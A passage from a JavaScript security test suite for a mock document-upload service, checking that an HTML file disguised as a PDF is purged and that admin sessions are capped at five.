        fd.append('', new Blob([buf], { type: 'application/pdf' }));
        return handleMockRoute(new Request(`http://localhost${uploadUrl}`, { method: 'PUT', body: fd }));
    };
    await uploadBlob(createRes.uploads[0].uploadUrl, htmlBytes);
    await uploadBlob(createRes.uploads[1].uploadUrl, validPdf);

    await callMock('request', {
        step: 'finish',
        t: createRes.token,
        fileIds: createRes.uploads.map(u => u.fileId),
    });

    const viewAfterUpload = await (await callMock('track', { t: createRes.token, action: 'view' })).json();
    assert.equal(viewAfterUpload.files.length, 1, 'Disguised HTML-as-PDF must be purged and only genuine PDF kept');
    assert.equal(viewAfterUpload.files[0].name, 'genuine-summons.pdf');
    assert.match(viewAfterUpload.files[0].sha256, /^[0-9a-f]{64}$/);
    totalAssertions += 4;

    // 11c. Admin concurrent session cap (max 5 active sessions per admin; 6th login evicts the 1st)
    const adminCookies = [];
    for (let i = 0; i < 6; i++) {
        const r = await callMock('admin', { action: 'verify-code', email: 'nicksprocessservices@outlook.com', code: '12345678' });
        adminCookies.push(r.headers.get('set-cookie').split(';')[0]);
    }
    const oldestRes = await callMock('admin', { action: 'me' }, adminCookies[0]);
    assert.equal(oldestRes.status, 401, '1st admin session must be evicted once 6th session is created (cap = 5)');
    for (let i = 1; i < 6; i++) {
        const activeRes = await callMock('admin', { action: 'me' }, adminCookies[i]);
        assert.equal(activeRes.status, 200, `Session ${i + 1} of 6 must remain active`);
        totalAssertions++;
    }
    totalAssertions += 1;
});

console.log(`${passed} security & stress test suites passed (${totalAssertions} individual security assertions verified)`);
